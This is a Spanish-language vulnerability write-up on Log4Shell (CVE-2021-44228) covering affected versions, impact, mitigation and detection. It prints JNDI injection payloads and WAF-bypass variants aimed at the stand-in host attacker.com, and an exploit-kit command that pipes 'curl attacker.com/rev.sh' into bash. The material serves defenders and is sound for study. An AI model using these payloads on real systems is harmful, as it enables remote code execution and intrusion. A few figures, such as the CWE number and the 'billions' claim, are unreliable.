---
title: "Log4Shell - CVE-2021-44228"
description: "Vulnerabilidad cr√≠tica de RCE en Apache Log4j 2. Permite ejecuci√≥n remota de c√≥digo sin autenticaci√≥n mediante JNDI injection. CVSS 10.0/10."
category: "vulnerabilities"
tags: ["rce", "java", "log4j", "critical", "jndi", "ldap", "cve", "0day"]
---

# Log4Shell (CVE-2021-44228)

**Log4Shell** es una vulnerabilidad **cr√≠tica** de **Ejecuci√≥n Remota de C√≥digo (RCE)** en la biblioteca Apache Log4j 2, descubierta en diciembre de 2021. Es considerada una de las vulnerabilidades m√°s graves de la √∫ltima d√©cada.

## Informaci√≥n T√©cnica

- **CVE ID**: CVE-2021-44228
- **CVSS Score**: **10.0/10** (Critical)
- **CWE**: CWE-502 (Deserialization of Untrusted Data)
- **Descubierta**: 9 de diciembre de 2021
- **Descubridor**: Chen Zhaojun (Alibaba Cloud Security)

## Componente Afectado

**Apache Log4j 2**
- Versiones afectadas: `2.0-beta9` hasta `2.14.1`
- Biblioteca de logging muy utilizada en Java
- Presente en miles de aplicaciones empresariales

## Vectores de Ataque

### JNDI Injection
La vulnerabilidad explota la funci√≥n de **JNDI lookup** en Log4j:

```java
// Log vulnerable que procesa input del usuario
logger.info("User agent: {}", request.getHeader("User-Agent"));
```

### Payload B√°sico
```bash
${jndi:ldap://attacker.com/evil}
```

### Vectores Comunes

1. **HTTP Headers**
   ```http
   User-Agent: ${jndi:ldap://attacker.com/a}
   X-Forwarded-For: ${jndi:ldap://attacker.com/a}
   Referer: ${jndi:ldap://attacker.com/a}
   ```

2. **Request Parameters**
   ```
   ?username=${jndi:ldap://attacker.com/a}
   ```

3. **POST Data**
   ```json
   {
     "username": "${jndi:ldap://attacker.com/a}"
   }
   ```

4. **Minecraft Servers**
   ```
   Chat message: ${jndi:ldap://attacker.com/a}
   ```

## Bypass Techniques

### Obfuscaci√≥n B√°sica
```bash
${jndi:ldap://attacker.com/a}
${${lower:j}ndi:ldap://attacker.com/a}
${${upper:j}ndi:ldap://attacker.com/a}
${${::-j}ndi:ldap://attacker.com/a}
```

### Bypass de WAF
```bash
${jndi:${lower:l}${lower:d}a${lower:p}://attacker.com/a}
${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//attacker.com/a}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/a}
```

## Impacto

### Explotaci√≥n
1. **Attacker** env√≠a payload malicioso
2. **Log4j** procesa el log con JNDI lookup
3. **Aplicaci√≥n** hace request a servidor LDAP del atacante
4. **Servidor LDAP** responde con Java class maliciosa
5. **Aplicaci√≥n** ejecuta c√≥digo del atacante

### Consecuencias
- ‚úÖ **RCE** - Ejecuci√≥n remota de c√≥digo
- ‚úÖ **Sin autenticaci√≥n** requerida
- ‚úÖ **Informaci√≥n sensible** - Robo de datos
- ‚úÖ **Instalaci√≥n de malware**
- ‚úÖ **Movimiento lateral** en redes internas
- ‚úÖ **Ransomware**

## Versiones Afectadas

| Versi√≥n Log4j | Estado |
|---------------|--------|
| 2.0-beta9 - 2.14.1 | ‚ùå **Vulnerable** |
| 2.15.0 | ‚ö†Ô∏è Bypass posible (CVE-2021-45046) |
| 2.16.0 | ‚ö†Ô∏è DoS posible (CVE-2021-45105) |
| 2.17.0 | ‚úÖ **Segura** (Java 8) |
| 2.17.1+ | ‚úÖ **Segura** (Java 7) |

## Mitigaci√≥n

### 1. Actualizar Log4j (Recomendado)
```xml
<!-- pom.xml -->
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-core</artifactId>
    <version>2.17.1</version>
</dependency>
```

### 2. Configurar JVM Flag
```bash
-Dlog4j2.formatMsgNoLookups=true
```

### 3. Remover JndiLookup Class
```bash
zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class
```

### 4. Configuraci√≥n Log4j
```properties
log4j2.formatMsgNoLookups=true
```

## Detecci√≥n

### Buscar Log4j en Sistemas
```bash
# Linux
find / -name "log4j-core-*.jar" 2>/dev/null

# Verificar versi√≥n
unzip -p log4j-core-*.jar META-INF/MANIFEST.MF | grep Implementation-Version
```

### Escaneo de Red
```bash
# Nmap NSE script
nmap -p80,443,8080 --script log4shell target.com

# Nuclei
nuclei -t log4j/ -u https://target.com
```

### Honeypot/Canary Token
```bash
# Usar DNS canary
${jndi:ldap://your-unique-id.canarytokens.com/a}
```

## Herramientas de Explotaci√≥n

### Scanner
```bash
# Log4j-scan
python3 log4j-scan.py -u https://target.com

# Nuclei templates
nuclei -t cves/2021/CVE-2021-44228.yaml -u https://target.com
```

### Exploitation Framework
```bash
# JNDI-Exploit-Kit
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "curl attacker.com/rev.sh|bash"

# Marshalsec
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8000/#Exploit
```

## Aplicaciones Afectadas (Ejemplos)

### Enterprise Software
- Apache Struts2
- Apache Solr
- Apache Druid
- Apache Flink
- Elasticsearch
- VMware vCenter
- Steam

### Productos Cloud
- AWS
- Google Cloud
- Azure
- Cloudflare
- Twitter
- Apple iCloud

### Gaming
- Minecraft Java Edition
- Minecraft: Bedrock Edition (parcial)

## CVEs Relacionadas

### CVE-2021-45046
- **CVSS**: 9.0
- **Descripci√≥n**: Bypass de fix en 2.15.0
- **Fix**: Log4j 2.16.0

### CVE-2021-45105
- **CVSS**: 7.5
- **Descripci√≥n**: DoS por recursi√≥n infinita
- **Fix**: Log4j 2.17.0

### CVE-2021-44832
- **CVSS**: 6.6
- **Descripci√≥n**: RCE via JDBC Appender
- **Fix**: Log4j 2.17.1

## Timeline

- **24/11/2021**: Descubrimiento por Alibaba Cloud
- **09/12/2021**: Divulgaci√≥n p√∫blica
- **10/12/2021**: Explotaci√≥n masiva en Internet
- **13/12/2021**: Release Log4j 2.15.0
- **14/12/2021**: CVE-2021-45046 (bypass)
- **18/12/2021**: Release Log4j 2.17.0
- **28/12/2021**: CVE-2021-44832 descubierta

## Recursos

### Oficiales
- [Apache Log4j Security](https://logging.apache.org/log4j/2.x/security.html)
- [CISA Advisory](https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-356a)
- [NVD CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

### Herramientas
- [log4j-scan](https://github.com/fullhunt/log4j-scan)
- [JNDI-Exploit-Kit](https://github.com/pimps/JNDI-Exploit-Kit)
- [Nuclei Templates](https://github.com/projectdiscovery/nuclei-templates/tree/master/cves/2021)

### Writeups y An√°lisis
- [LunaSec Advisory](https://www.lunasec.io/docs/blog/log4j-zero-day/)
- [Swiss Gov NCSC](https://www.ncsc.admin.ch/ncsc/en/home/cyberangriffe/aktuelle-cybervorfaelle/schwachstelle-log4j.html)
- [HackerOne Bug Bounty Reports](https://hackerone.com/reports?q=log4shell)

---

**‚ö†Ô∏è Impacto Global**: Se estima que **billones** de dispositivos fueron afectados por Log4Shell, convirti√©ndola en una de las vulnerabilidades m√°s impactantes de la historia.

**üîí Acci√≥n Recomendada**: Si tu organizaci√≥n usa Java, verifica INMEDIATAMENTE si Log4j est√° presente y actualiza a la versi√≥n m√°s reciente.
